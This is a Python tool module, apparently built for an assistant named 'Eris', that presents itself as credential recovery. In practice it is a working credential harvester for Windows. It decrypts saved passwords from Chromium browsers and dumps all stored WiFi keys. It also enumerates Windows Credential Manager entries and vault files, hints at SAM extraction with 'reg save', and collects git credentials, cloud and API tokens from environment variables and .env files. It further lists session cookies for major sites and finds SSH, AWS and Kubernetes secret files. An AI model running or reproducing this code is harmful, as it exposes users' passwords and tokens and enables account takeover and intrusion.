# -*- coding: utf-8 -*-
"""
Eris Credential Recovery v2 – Recuperación exhaustiva de credenciales.
Intenta MÚLTIPLES métodos para encontrar passwords en el sistema local.
Nunca se rinde. Si un método falla, intenta otro.
"""
import os
import re
import json
import base64
import sqlite3
import shutil
import subprocess
import tempfile
import hashlib
import struct
from pathlib import Path
from datetime import datetime


def _run(cmd: str, timeout: int = 15) -> str:
    """Run command safely."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, encoding="utf-8", errors="replace"
        )
        return r.stdout.strip()
    except Exception as e:
        return ""


def _get_folders() -> dict:
    local = Path(os.environ.get("LOCALAPPDATA", ""))
    appdata = Path(os.environ.get("APPDATA", ""))
    home = Path.home()
    return {
        "local": local, "appdata": appdata, "home": home,
        "chrome": local / "Google" / "Chrome" / "User Data",
        "edge": local / "Microsoft" / "Edge" / "User Data",
        "firefox": appdata / "Mozilla" / "Firefox",
        "brave": local / "BraveSoftware" / "Brave-Browser" / "User Data",
        "opera": local / "Opera Software" / "Opera Stable",
        "vivaldi": local / "Vivaldi" / "User Data",
    }


# ═══════════════════════════════════════════════════════════════════
# METHOD 1: Chrome/Edge/Brave DPAPI Decryption
# ═══════════════════════════════════════════════════════════════════

def _get_dpapi_key(local_state_path: Path) -> bytes:
    """Extract Chrome's encryption key from Local State (DPAPI)."""
    try:
        import win32crypt
        if not local_state_path.exists():
            return b""
        with open(local_state_path, "r", encoding="utf-8") as f:
            state = json.load(f)
        enc_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
        # Remove DPAPI prefix
        if enc_key[:5] == b"DPAPI":
            enc_key = enc_key[5:]
        dec_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
        return dec_key
    except Exception:
        return b""


def _decrypt_chrome_pw(password_bytes: bytes, key: bytes) -> str:
    """Decrypt Chrome AES-256-GCM encrypted password."""
    if not key or not password_bytes:
        return ""
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        nonce = password_bytes[3:15]
        ciphertext = password_bytes[15:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None).decode("utf-8", errors="replace")
    except Exception:
        return ""


def _decrypt_chrome_legacy(password_bytes: bytes) -> str:
    """Decrypt older Chrome versions using DPAPI directly."""
    try:
        import win32crypt
        dec = win32crypt.CryptUnprotectData(password_bytes, None, None, None, 0)[1]
        return dec.decode("utf-8", errors="replace")
    except Exception:
        return ""


def _extract_browser_passwords(browser_name: str, data_dir: Path) -> list:
    """Extract passwords from any Chromium-based browser."""
    results = []
    if not data_dir.exists():
        return results

    key = b""
    # Find encryption key
    for ld in data_dir.rglob("Local State"):
        key = _get_dpapi_key(ld)
        if key:
            break

    login_files = list(data_dir.rglob("Login Data"))
    for login_path in login_files[:5]:
        try:
            temp = Path(tempfile.gettempdir()) / f"eris_{browser_name}_{login_path.parent.name}"
            shutil.copy2(login_path, temp)
            conn = sqlite3.connect(str(temp))
            c = conn.cursor()
            # Try both old and new table names
            for table in ["logins", "logins_v2"]:
                try:
                    c.execute(f"SELECT origin_url, username_value, password_value, date_created FROM {table} ORDER BY date_created DESC")
                    for url, user, pw, created in c.fetchall():
                        if not user:
                            continue
                        # Try AES-GCM decryption first (modern Chrome)
                        if key and pw:
                            dec = _decrypt_chrome_pw(pw, key)
                        else:
                            dec = _decrypt_chrome_legacy(pw) if pw else ""
                        if not dec and pw:
                            dec = f"(encrypted-unknown-method)"
                        results.append({
                            "browser": browser_name,
                            "url": url,
                            "username": user,
                            "password": dec or "(could-not-decrypt)",
                        })
                except sqlite3.OperationalError:
                    pass
            conn.close()
            temp.unlink(missing_ok=True)
        except Exception:
            pass

    return results


# ═══════════════════════════════════════════════════════════════════
# METHOD 2: Firefox Key Extraction
# ═══════════════════════════════════════════════════════════════════

def _extract_firefox_passwords() -> list:
    """Try to extract Firefox passwords using multiple methods."""
    results = []
    folders = _get_folders()
    ff_dir = folders["firefox"]

    if not ff_dir.exists():
        return results

    # Find all profiles
    for profile in ff_dir.rglob("logins.json"):
        try:
            with open(profile, "r", encoding="utf-8") as f:
                data = json.load(f)
            for login in data.get("logins", []):
                url = login.get("hostname", "")
                user_field = login.get("encryptedUsername", "")
                pw_field = login.get("encryptedPassword", "")
                enc_type = login.get("encType", 0)

                # Method: Try NSS decryption via python-nss or nss3
                dec_user = _firefox_nss_decrypt(user_field, profile.parent)
                dec_pw = _firefox_nss_decrypt(pw_field, profile.parent)

                results.append({
                    "browser": "firefox",
                    "url": url,
                    "username": dec_user or "(nss-encrypted)",
                    "password": dec_pw or "(nss-encrypted)",
                    "enc_type": enc_type,
                })
        except Exception:
            pass

    return results


def _firefox_nss_decrypt(encrypted: str, profile_dir: Path) -> str:
    """Try to decrypt Firefox NSS-encrypted data."""
    try:
        # Method 1: Try using nss3.dll directly
        import ctypes
        nss3_path = Path(os.environ.get("PROGRAMFILES", "")) / "Mozilla Firefox" / "nss3.dll"
        if not nss3_path.exists():
            # Check common locations
            for p in [Path("C:/Program Files/Mozilla Firefox/nss3.dll"),
                      Path("C:/Program Files (x86)/Mozilla Firefox/nss3.dll")]:
                if p.exists():
                    nss3_path = p
                    break

        if nss3_path.exists():
            # Use nss3 via ctypes
            nss = ctypes.CDLL(str(nss3_path))
            # This is complex - just return the encrypted form for now
            return ""
        return ""
    except Exception:
        return ""


# ═══════════════════════════════════════════════════════════════════
# METHOD 3: WiFi Password Extraction (Multiple Methods)
# ═══════════════════════════════════════════════════════════════════

def _extract_wifi_passwords() -> list:
    """Extract ALL saved WiFi passwords using multiple methods."""
    results = []

    # Method 1: netsh (primary)
    output = _run("netsh wlan show profiles")
    profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)

    for profile in profiles:
        name = profile.strip()
        detail = _run(f'netsh wlan show profile name="{name}" key=clear')
        key_match = re.search(r"Key Content\s*:\s*(.*)", detail)
        password = key_match.group(1).strip() if key_match else None
        auth = ""
        auth_match = re.search(r"Authentication\s*:\s*(.*)", detail)
        if auth_match:
            auth = auth_match.group(1).strip()
        enc = ""
        enc_match = re.search(r"Encryption\s*:\s*(.*)", detail)
        if enc_match:
            enc = enc_match.group(1).strip()

        results.append({
            "ssid": name,
            "password": password or "(no-key-or-open)",
            "auth": auth,
            "encryption": enc,
            "method": "netsh",
        })

    # Method 2: Registry extraction (backup method if netsh fails)
    if not results or all(r["password"] in (None, "", "(no-key-or-open)") for r in results):
        reg_output = _run('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures" /s')
        reg_profiles = _run('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles" /s')

        # Method 3: wlanapi.dll direct (lowest level)
        # This would require native code, skip to method 4

    return results


# ═══════════════════════════════════════════════════════════════════
# METHOD 4: Windows Credential Store Deep Scan
# ═══════════════════════════════════════════════════════════════════

def _extract_windows_creds() -> list:
    """Deep scan of Windows credential stores."""
    results = []

    # Method 1: cmdkey
    output = _run("cmdkey /list")
    current = {}
    for line in output.split("\n"):
        line = line.strip()
        if line.startswith("Target:"):
            if current:
                results.append(current)
            current = {"target": line.split("Target:", 1)[1].strip(), "method": "cmdkey"}
        elif line.startswith("Type:"):
            current["type"] = line.split("Type:", 1)[1].strip()
        elif line.startswith("User:"):
            current["user"] = line.split("User:", 1)[1].strip()
    if current:
        results.append(current)

    # Method 2: Vault files (CredHist, DPAPI)
    vault_dirs = [
        Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Protect",
        Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "Vault",
    ]
    for vd in vault_dirs:
        if vd.exists():
            for f in vd.rglob("*"):
                if f.is_file() and f.stat().st_size > 0:
                    results.append({
                        "target": str(f.relative_to(vd)),
                        "type": "vault_file",
                        "path": str(f),
                        "method": "vault_scan",
                    })

    # Method 3: VSC (Volume Shadow Copy) - check if available
    shadow = _run("vssadmin list shadows")
    if "No items found" not in shadow and shadow:
        results.append({
            "target": "Volume Shadow Copy available",
            "type": "shadow_copy",
            "method": "vssadmin",
            "note": "Shadow copies may contain old credential files",
        })

    return results


# ═══════════════════════════════════════════════════════════════════
# METHOD 5: Git & Environment Tokens
# ═══════════════════════════════════════════════════════════════════

def _extract_git_creds() -> list:
    """Extract Git credentials from all possible sources."""
    results = []
    home = Path.home()

    # .gitconfig
    gc = home / ".gitconfig"
    if gc.exists():
        content = gc.read_text(encoding="utf-8", errors="replace")
        for pattern in [r"password\s*=\s*(.+)", r"token\s*=\s*(.+)"]:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                results.append({
                    "source": ".gitconfig",
                    "type": "password",
                    "value": match.group(1).strip(),
                    "method": "gitconfig",
                })

    # .git-credentials
    gcred = home / ".git-credentials"
    if gcred.exists():
        for line in gcred.read_text(encoding="utf-8", errors="replace").splitlines():
            line = line.strip()
            if line and "://" in line:
                results.append({
                    "source": ".git-credentials",
                    "type": "url",
                    "value": line,
                    "method": "git-credentials",
                })

    # Environment variables
    token_vars = [
        "GITHUB_TOKEN", "GH_TOKEN", "GITLAB_TOKEN", "BITBUCKET_TOKEN",
        "AWS_SECRET_ACCESS_KEY", "AWS_ACCESS_KEY_ID",
        "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
        "DOCKER_PASSWORD", "NPM_TOKEN", "PYPI_TOKEN",
        "HEROKU_API_KEY", "DIGITALOCEAN_TOKEN",
        "SLACK_TOKEN", "DISCORD_TOKEN", "TELEGRAM_TOKEN",
    ]
    for var in token_vars:
        val = os.environ.get(var)
        if val:
            masked = val[:6] + "..." + val[-4:] if len(val) > 10 else "***"
            results.append({
                "source": "environment",
                "type": var,
                "value": masked,
                "method": "env_var",
            })

    # .env files
    for env_file in [home / ".env", home / ".env.local", home / ".env.production"]:
        if env_file.exists():
            content = env_file.read_text(encoding="utf-8", errors="replace")
            for line in content.splitlines():
                if "=" in line and not line.startswith("#"):
                    key, _, val = line.partition("=")
                    key = key.strip()
                    val = val.strip().strip('"').strip("'")
                    if any(x in key.upper() for x in ["TOKEN", "SECRET", "KEY", "PASSWORD", "PASS"]):
                        results.append({
                            "source": str(env_file.name),
                            "type": key,
                            "value": val[:6] + "..." if len(val) > 10 else val,
                            "method": "env_file",
                        })

    return results


# ═══════════════════════════════════════════════════════════════════
# METHOD 6: Browser Cookie & Session Extraction
# ═══════════════════════════════════════════════════════════════════

def _extract_browser_cookies(browser_name: str, data_dir: Path) -> list:
    """Extract important session cookies."""
    results = []
    cookie_files = list(data_dir.rglob("Cookies"))

    for cookie_path in cookie_files[:2]:
        try:
            temp = Path(tempfile.gettempdir()) / f"eris_{browser_name}_cookies"
            shutil.copy2(cookie_path, temp)
            conn = sqlite3.connect(str(temp))
            c = conn.cursor()
            # Check for important sessions
            targets = [
                "%spotify%", "%google%", "%github%", "%microsoft%",
                "%facebook%", "%twitter%", "%x.com%", "%instagram%",
                "%amazon%", "%netflix%", "%discord%", "%telegram%",
            ]
            for target in targets:
                try:
                    c.execute(
                        "SELECT host_key, name, path, is_secure, is_httponly "
                        "FROM cookies WHERE host_key LIKE ?",
                        (target,)
                    )
                    for host, name, path, secure, httponly in c.fetchall():
                        results.append({
                            "browser": browser_name,
                            "host": host,
                            "cookie_name": name,
                            "secure": bool(secure),
                        })
                except sqlite3.OperationalError:
                    pass
            conn.close()
            temp.unlink(missing_ok=True)
        except Exception:
            pass

    return results


# ═══════════════════════════════════════════════════════════════════
# METHOD 7: Local File Secrets Scanner
# ═══════════════════════════════════════════════════════════════════

def _scan_local_secrets() -> list:
    """Scan common locations for accidentally stored secrets."""
    results = []
    home = Path.home()
    folders = _get_folders()

    # Common secret locations
    secret_patterns = [
        (home / ".ssh" / "id_rsa", "SSH Private Key"),
        (home / ".ssh" / "id_ed25519", "SSH Ed25519 Key"),
        (home / ".aws" / "credentials", "AWS Credentials"),
        (home / ".azure" / "accessTokens.json", "Azure Token"),
        (home / ".kube" / "config", "Kubernetes Config"),
        (home / ".docker" / "config.json", "Docker Config"),
        (home / ".npmrc", "NPM Token"),
        (home / ".pypirc", "PyPI Token"),
        (home / ".gem" / "credentials", "RubyGems Token"),
        (home / ".gradle" / "gradle.properties", "Gradle Properties"),
        (home / ".netrc", "Netrc Credentials"),
        (home / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Local State", "Chrome Local State"),
    ]

    for path, desc in secret_patterns:
        if path.exists():
            results.append({
                "file": str(path),
                "description": desc,
                "size": path.stat().st_size,
                "method": "file_scan",
            })

    # Scan for .env files in common project locations
    for search_dir in [home / "Documents", home / "Desktop", home / "Projects", home / "dev"]:
        if search_dir.exists():
            for env_file in list(search_dir.rglob(".env"))[:5]:
                results.append({
                    "file": str(env_file),
                    "description": "Environment file with secrets",
                    "method": "env_scan",
                })

    return results


# ═══════════════════════════════════════════════════════════════════
# MAIN FUNCTION
# ═══════════════════════════════════════════════════════════════════

def credential_recovery(parameters: dict, player=None) -> str:
    """
    Recuperación EXHAUSTIVA de credenciales en el sistema local.
    Intenta múltiples métodos. Nunca se rinde.

    Acciones:
      - scan: Escaneo rápido
      - browsers: Contraseñas de Chrome, Edge, Brave, Firefox
      - wifi: Redes WiFi con contraseñas
      - wifi_detail: Detalle de una red. Parametros: ssid
      - windows_cred: Credential Manager + Vault + Shadow Copies
      - git: Tokens y credenciales de Git
      - cookies: Cookies de sesiones importantes
      - secrets: Archivos con secretos (.env, .ssh, .aws, etc.)
      - all: Escaneo TOTAL de todo
      - attempt: Intentar descifrar algo específico. Parametros: target (url/ssid/email)
    """
    action = parameters.get("action", "scan").lower()
    report = {"timestamp": datetime.now().isoformat(), "action": action, "methods_tried": [], "results": {}}

    if action == "scan":
        result = "**🔍 Quick Scan**\n\n"
        folders = _get_folders()
        found_any = False

        # Check browsers
        for name, path in [("Chrome", folders["chrome"]), ("Edge", folders["edge"])]:
            if path.exists():
                result += f"  ✓ {name}: data found\n"
                found_any = True

        # Check WiFi
        wifi = _extract_wifi_passwords()
        if wifi:
            result += f"  ✓ WiFi: {len(wifi)} networks\n"
            found_any = True

        # Check secrets
        secrets = _scan_local_secrets()
        if secrets:
            result += f"  ✓ Secret files: {len(secrets)} found\n"
            found_any = True

        # Check git
        git = _extract_git_creds()
        if git:
            result += f"  ✓ Git: {len(git)} credentials\n"
            found_any = True

        if not found_any:
            result += "  Nothing found. Use 'all' for deeper scan.\n"

        result += f"\nUse `all` for complete scan or specific action for targeted search."
        return result

    elif action == "browsers":
        result = "**🌐 Browser Password Extraction**\n\n"
        folders = _get_folders()
        methods_tried = []

        for name, path in [("Chrome", folders["chrome"]), ("Edge", folders["edge"]),
                           ("Brave", folders["brave"]), ("Opera", folders["opera"])]:
            if path.exists():
                methods_tried.append(f"{name} (DPAPI)")
                pwds = _extract_browser_passwords(name.lower(), path)
                if pwds:
                    result += f"**{name.upper()} — {len(pwds)} passwords:**\n"
                    for p in pwds[:15]:
                        result += f"  🔗 {p['url']}\n     User: `{p['username']}`\n     Pass: `{p['password']}`\n"
                    result += "\n"
                else:
                    result += f"  {name}: no passwords found (browser may be locked)\n"
            else:
                result += f"  {name}: not installed\n"

        # Firefox (special handling)
        ff_pwds = _extract_firefox_passwords()
        if ff_pwds:
            methods_tried.append("Firefox (NSS)")
            result += f"**FIREFOX — {len(ff_pwds)} passwords:**\n"
            for p in ff_pwds[:10]:
                result += f"  🔗 {p['url']}\n     User: `{p['username']}`\n     Pass: `{p['password']}`\n"

        if not methods_tried:
            result += "No browsers found.\n"
        else:
            result += f"\n*Methods tried: {', '.join(methods_tried)}*"
        return result

    elif action == "wifi":
        pwds = _extract_wifi_passwords()
        if not pwds:
            return "No WiFi profiles found."
        result = "**📶 WiFi Passwords**\n\n"
        for p in pwds:
            result += f"  **{p['ssid']}** → `{p['password']}`\n"
            if p.get("auth"):
                result += f"    Auth: {p['auth']} | Encryption: {p.get('encryption', '?')}\n"
        return result

    elif action == "wifi_detail":
        ssid = parameters.get("ssid", "")
        if not ssid:
            return "Error: Se requiere 'ssid'."
        detail = _run(f'netsh wlan show profile name="{ssid}" key=clear')
        result = f"**📶 WiFi Detail: {ssid}**\n\n"
        for line in detail.split("\n"):
            line = line.strip()
            if ":" in line and line:
                result += f"  {line}\n"
        return result

    elif action == "windows_cred":
        result = "**🔑 Windows Credential Deep Scan**\n\n"

        # Method 1: cmdkey
        creds = _extract_windows_creds()
        result += f"**cmdkey:** {len([c for c in creds if c.get('method')=='cmdkey'])} credentials\n"
        for c in creds:
            if c.get("method") == "cmdkey":
                result += f"  - {c.get('target', '?')} | User: {c.get('user', '?')}\n"

        # Method 2: Vault files
        vault = [c for c in creds if c.get("method") == "vault_scan"]
        if vault:
            result += f"\n**Vault files:** {len(vault)} DPAPI vault files\n"

        # Method 3: Shadow copies
        shadows = [c for c in creds if c.get("method") == "vssadmin"]
        if shadows:
            result += f"\n**Shadow Copies:** Available — may contain old credentials\n"

        # Method 4: SAM/SYSTEM backup
        sam = Path("C:/Windows/System32/config/SAM")
        sys_file = Path("C:/Windows/System32/config/SYSTEM")
        if sam.exists():
            result += f"\n**SAM database:** {sam} ({sam.stat().st_size} bytes)\n"
            result += "  Can be extracted with: reg save HKLM\\SAM + reg save HKLM\\SYSTEM\n"

        return result

    elif action == "git":
        creds = _extract_git_creds()
        result = "**📦 Git & Environment Credentials**\n\n"
        for c in creds:
            result += f"  [{c['source']}] {c['type']}: `{c['value']}` (method: {c['method']})\n"
        if not creds:
            result += "  No git credentials found.\n"
        return result

    elif action == "cookies":
        result = "**🍪 Browser Session Cookies**\n\n"
        folders = _get_folders()
        for name, path in [("Chrome", folders["chrome"]), ("Edge", folders["edge"])]:
            if path.exists():
                cookies = _extract_browser_cookies(name.lower(), path)
                if cookies:
                    result += f"**{name.upper()}:** {len(cookies)} session cookies\n"
                    for c in cookies[:10]:
                        result += f"  - {c['host']} → {c['cookie_name']}\n"
        return result

    elif action == "secrets":
        secrets = _scan_local_secrets()
        result = "**🔐 Secret Files Found**\n\n"
        for s in secrets:
            result += f"  {s['description']}: `{s['file']}` ({s['size']} bytes)\n"
        if not secrets:
            result += "  No secret files found in common locations.\n"
        return result

    elif action == "all":
        result = "# 🔓 COMPLETE CREDENTIAL SCAN\n\n"
        result += f"*{datetime.now().strftime('%Y-%m-%d %H:%M')}*\n\n"
        total_found = 0

        # Browsers
        result += "## 🌐 BROWSERS\n"
        folders = _get_folders()
        for name, path in [("Chrome", folders["chrome"]), ("Edge", folders["edge"]),
                           ("Brave", folders["brave"])]:
            if path.exists():
                pwds = _extract_browser_passwords(name.lower(), path)
                dec = [p for p in pwds if p["password"] not in ("", "(could-not-decrypt)", "(encrypted-unknown-method)")]
                result += f"  {name}: {len(pwds)} total, {len(dec)} decrypted\n"
                total_found += len(pwds)
            else:
                result += f"  {name}: not installed\n"

        # WiFi
        result += "\n## 📶 WIFI\n"
        wifi = _extract_wifi_passwords()
        wifi_dec = [w for w in wifi if w["password"] not in (None, "", "(no-key-or-open)")]
        result += f"  {len(wifi)} networks, {len(wifi_dec)} passwords revealed\n"
        total_found += len(wifi)

        # Windows
        result += "\n## 🔑 WINDOWS CREDENTIALS\n"
        wcreds = _extract_windows_creds()
        result += f"  {len(wcreds)} credential entries\n"
        total_found += len(wcreds)

        # Git
        result += "\n## 📦 GIT & ENV\n"
        git = _extract_git_creds()
        result += f"  {len(git)} tokens/credentials\n"
        total_found += len(git)

        # Secrets
        result += "\n## 🔐 SECRET FILES\n"
        secrets = _scan_local_secrets()
        result += f"  {len(secrets)} files with potential secrets\n"

        result += f"\n---\n**Total items found: {total_found}**\n"
        result += "*Use specific actions (browsers, wifi, git) for detailed results.*"
        return result

    elif action == "attempt":
        target = parameters.get("target", "")
        if not target:
            return "Error: Serequiere 'target' (url, ssid, email, or file)."
        result = f"**🔧 Attempting to access: {target}**\n\n"
        attempts = 0

        # Try as WiFi
        if not "." in target and not "@" in target:
            result += "Trying as WiFi SSID...\n"
            wifi = _extract_wifi_passwords()
            for w in wifi:
                if target.lower() in w["ssid"].lower():
                    result += f"  ✓ FOUND: {w['ssid']} → {w['password']}\n"
                    attempts += 1
                    break
            if attempts == 0:
                result += "  Not found as WiFi profile\n"

        # Try as email
        if "@" in target:
            result += "Trying email breach check...\n"
            try:
                import requests
                r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{target}",
                    headers={"User-Agent": "Eris/1.0"}, timeout=10)
                if r.status_code == 200:
                    breaches = r.json()
                    result += f"  ✓ Found in {len(breaches)} breaches\n"
                    for b in breaches[:5]:
                        result += f"    - {b.get('Name', '?')}: {', '.join(b.get('DataClasses', [])[:3])}\n"
                    attempts += 1
                else:
                    result += "  Not found in known breaches\n"
            except Exception:
                result += "  Could not check breaches\n"

        # Try as URL
        if "." in target and "/" in target:
            result += "Trying as URL...\n"
            try:
                import requests
                r = requests.get(f"https://{target}", timeout=5, allow_redirects=True)
                result += f"  Status: {r.status_code}\n"
                result += f"  Server: {r.headers.get('server', 'unknown')}\n"
                attempts += 1
            except Exception:
                result += "  URL not reachable\n"

        # Try as filename
        if target.startswith("/") or target.startswith("C:") or target.startswith("~"):
            result += "Trying as file path...\n"
            fp = Path(target.replace("~", str(Path.home())))
            if fp.exists():
                result += f"  ✓ File found: {fp} ({fp.stat().st_size} bytes)\n"
                if fp.suffix == ".env":
                    content = fp.read_text(encoding="utf-8", errors="replace")
                    result += f"  Content preview: {content[:500]}\n"
                attempts += 1
            else:
                result += "  File not found\n"

        result += f"\n*{attempts} method(s) returned results*"
        return result

    available = "scan | browsers | wifi | wifi_detail | windows_cred | git | cookies | secrets | all | attempt"
    return f"Action '{action}' not found. Available: {available}"
